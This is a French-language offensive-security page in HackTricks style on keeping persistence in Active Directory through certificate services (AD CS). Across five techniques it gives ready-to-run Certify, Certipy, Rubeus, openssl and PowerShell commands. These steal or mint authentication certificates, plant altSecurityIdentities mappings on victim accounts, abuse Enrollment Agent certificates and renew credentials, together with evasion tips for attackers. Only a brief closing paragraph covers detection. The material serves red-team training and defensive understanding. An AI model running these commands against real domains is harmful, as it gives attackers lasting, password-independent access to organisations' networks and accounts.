# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un petit résumé des chapitres sur la persistance de compte issus de l'excellente recherche de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendre le vol d'identifiants d'utilisateur actif avec des certificats – PERSIST1

Dans un scénario où un certificat permettant l'authentification au domaine peut être demandé par un utilisateur, un attaquant a la possibilité de demander et de voler ce certificat afin de maintenir une persistance sur un réseau. Par défaut, le modèle `User` dans Active Directory autorise ce type de requêtes, bien qu'il puisse parfois être désactivé.

En utilisant [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), vous pouvez rechercher des modèles activés qui autorisent l'authentification du client, puis en demander un :
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
La puissance d’un certificat réside dans sa capacité à s’authentifier en tant qu’utilisateur auquel il appartient, indépendamment des changements de mot de passe, tant que le certificat reste valide.

Vous pouvez convertir PEM en PFX et l’utiliser pour obtenir un TGT :
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note : Combiné avec d'autres techniques (voir les sections THEFT), l'authentification basée sur les certificates permet un accès persistant sans toucher LSASS et même depuis des contextes non élevés.

## Obtenir une persistance machine avec des certificates - PERSIST2

Si un attaquant dispose de privilèges élevés sur un hôte, il peut inscrire le compte machine du système compromis pour obtenir un certificate en utilisant le template par défaut `Machine`. S'authentifier en tant que machine permet S4U2Self pour les services locaux et peut fournir une persistance durable sur l'hôte :
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Étendre la persistance via le renouvellement de certificat - PERSIST3

L’abus des périodes de validité et de renouvellement des modèles de certificat permet à un attaquant de maintenir un accès à long terme. Si vous possédez un certificat précédemment émis et sa clé privée, vous pouvez le renouveler avant son expiration afin d’obtenir un nouvel identifiant à longue durée de vie, sans laisser d’artefacts de requête supplémentaires liés au principal d’origine.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Astuce opérationnelle : suivez les durées de vie des fichiers PFX détenus par l’attaquant et renouvelez-les tôt. Le renouvellement peut aussi faire en sorte que les certificats mis à jour incluent l’extension moderne de mappage SID, les gardant utilisables sous des règles de mappage DC plus strictes (voir la section suivante).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Si vous pouvez écrire dans l’attribut `altSecurityIdentities` d’un compte cible, vous pouvez mapper explicitement un certificat contrôlé par l’attaquant à ce compte. Cela persiste à travers les changements de mot de passe et, lors de l’utilisation de formats de mappage forts, reste fonctionnel sous l’application moderne des règles DC.

Flux général :

1. Obtenez ou émettez un certificat client-auth que vous contrôlez (par ex., inscrivez le template `User` en tant que vous-même).
2. Extrayez un identifiant fort du cert (Issuer+Serial, SKI, ou SHA1-PublicKey).
3. Ajoutez un mappage explicite sur `altSecurityIdentities` du principal victime en utilisant cet identifiant.
4. Authentifiez-vous avec votre cert ; le DC le mappe à la victime via le mappage explicite.

Exemple (PowerShell) utilisant un mappage fort Issuer+Serial :
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Puis authentifiez-vous avec votre PFX. Certipy obtiendra directement un TGT :
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construire des correspondances `altSecurityIdentities` fortes

En pratique, les correspondances **Issuer+Serial** et **SKI** sont les formats forts les plus faciles à construire à partir d’un certificat détenu par l’attaquant. Cela compte après le **11 février 2025**, lorsque les DCs passent par défaut en **Full Enforcement** et que les correspondances faibles cessent d’être fiables.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Utilisez uniquement des types de mapping forts : `X509IssuerSerialNumber`, `X509SKI`, ou `X509SHA1PublicKey`. Les formats faibles (Subject/Issuer, Subject-only, RFC822 email) sont obsolètes et peuvent être bloqués par la politique du DC.
- Le mapping fonctionne à la fois sur les objets **user** et **computer**, donc l’accès en écriture à `altSecurityIdentities` d’un compte computer suffit pour persister en tant que cette machine.
- La chaîne de certificats doit remonter jusqu’à une racine approuvée par le DC. Les Enterprise CAs dans NTAuth sont généralement approuvées ; certains environnements font aussi confiance aux public CAs.
- L’authentification Schannel reste utile pour la persistance même lorsque PKINIT échoue parce que le DC manque l’EKU Smart Card Logon ou renvoie `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Sur les domain controllers **Windows Server 2022+** corrigés avec la mise à jour de sécurité du **9 septembre 2025**, Microsoft a ajouté un autre format de mapping explicite fort, intéressant pour la persistance car il survit à la réémission du certificat par la même CA :
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Opérationnellement, cela diffère des anciens formats forts :
- `Issuer+Serial` pointe **un certificat exact**.
- `SKI` / `SHA1-PUKEY` pointe **une paire de clés**.
- `Issuer/SID` pointe **la CA émettrice + le SID cible**, donc les certificats renouvelés ou réémis par la même CA continuent de fonctionner sans réécrire `altSecurityIdentities`.

Requirements and caveats
- Le certificat présenté pour l’authentification doit réellement contenir le SID du compte cible dans l’extension de sécurité SID.
- Ce format n’est pas utile pour les certificats de style `ESC9` / `ESC16` qui omettent l’extension SID ; dans ces cas, revenez à `Issuer+Serial`, `SKI` ou `SHA1-PUKEY`.

Pour plus d’informations sur les mappages explicites faibles et les chemins d’attaque, voir :


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent comme Persistence – PERSIST5

Si vous obtenez un certificat valide de Certificate Request Agent/Enrollment Agent, vous pouvez générer à volonté de nouveaux certificats capables de servir à l’authentification au nom des utilisateurs et conserver le PFX de l’agent hors ligne comme jeton de persistence. Flux d’abus :
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La révocation du certificat de l'agent ou des permissions du template est nécessaire pour supprimer cette persistance.

Notes opérationnelles
- Les versions modernes de `Certipy` prennent en charge à la fois `-on-behalf-of` et `-renew`, donc un attaquant détenant un PFX d'Enrollment Agent peut émettre puis renouveler des certificats leaf sans retoucher le compte cible d'origine.
- Si la récupération du TGT basée sur PKINIT n'est pas possible, le certificat on-behalf-of obtenu reste utilisable pour l'authentification Schannel avec `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Utiliser des certificats persistés lorsque PKINIT échoue

Si le DC ne possède pas de certificat compatible Smart Card Logon, la connexion par certificat via PKINIT peut échouer avec `KDC_ERR_PADATA_TYPE_NOSUPP`. Cela ne **supprime** pas le mécanisme de persistance : le même PFX est souvent encore utilisable pour un accès LDAP authentifié via Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
C'est particulièrement utile après PERSIST4/PERSIST5, car vous pouvez continuer à opérer depuis Linux/macOS et enchaîner d'autres actions de persistance dans le répertoire, comme déposer des [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ou modifier des attributs de delegation inscriptibles.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 a introduit Strong Certificate Mapping Enforcement sur les domain controllers. Depuis le **11 février 2025**, les DCs utilisent par défaut le mode **Full Enforcement** pour les mappings faibles/ambigus, et depuis la mise à jour de sécurité du **9 septembre 2025**, les DCs patchés ne prennent plus en charge l'ancien repli du mode Compatibility. Implications pratiques :

- Les certificats pré-2022 qui n'ont pas l'extension de mapping SID peuvent échouer lors du mapping implicite quand les DCs sont en Full Enforcement. Les attaquants peuvent conserver l'accès soit en renouvelant les certificats via AD CS (pour obtenir l'extension SID), soit en ajoutant un strong explicit mapping dans `altSecurityIdentities` (PERSIST4).
- Les explicit mappings utilisant des formats strong (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, et sur les DCs modernes `Issuer/SID`) continuent de fonctionner. Les formats faibles (Issuer/Subject, Subject-only, RFC822) peuvent être bloqués et doivent être évités pour la persistance.
- Si les mappings faibles semblent encore fonctionner, considérez que vous avez touché un DC non patché ou configuré différemment, plutôt qu'un chemin de persistance fiable à long terme.
- Les chemins d'émission de type `ESC9` / `ESC16` qui suppriment l'extension SID rendent `Issuer/SID` inutilisable, donc des strong mappings de repli ou un renouvellement via un template normal deviennent l'option de persistance pratique.

Les administrateurs doivent surveiller et alerter sur :
- Les changements de `altSecurityIdentities` et les émissions/renouvellements des certificats Enrollment Agent et User.
- Les logs d'émission de la CA pour les requêtes on-behalf-of et les schémas de renouvellement inhabituels.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
